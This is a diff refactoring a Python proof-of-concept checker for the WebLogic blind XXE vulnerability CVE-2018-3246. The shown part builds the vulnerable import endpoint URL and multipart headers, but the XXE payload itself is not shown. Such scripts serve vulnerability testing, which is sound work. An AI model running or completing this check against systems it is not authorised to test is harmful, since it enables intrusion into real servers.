@@ -13,20 +13,14 @@ import hashlib
 import datetime
 import warnings
 import requests
-
-
-class ws_utc_xxe_BaseVerify:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['weblogic blind XXE漏洞(CVE-2018-3246)', '', '']
         headers = {
             "Content-Type":"multipart/form-data; boundary=----WebKitFormBoundaryUFcVz4AB2dQvWbyH",
             "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
             }
         payload = "/ws_utc/resources/ws/config/import?timestamp=123123"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         time_stamp = time.mktime(datetime.datetime.now().timetuple())
         m = hashlib.md5(str(time_stamp).encode(encoding='utf-8'))
         md5_str = m.hexdigest()
@@ -48,5 +42,4 @@ class ws_utc_xxe_BaseVerify:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = ws_utc_xxe_BaseVerify(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
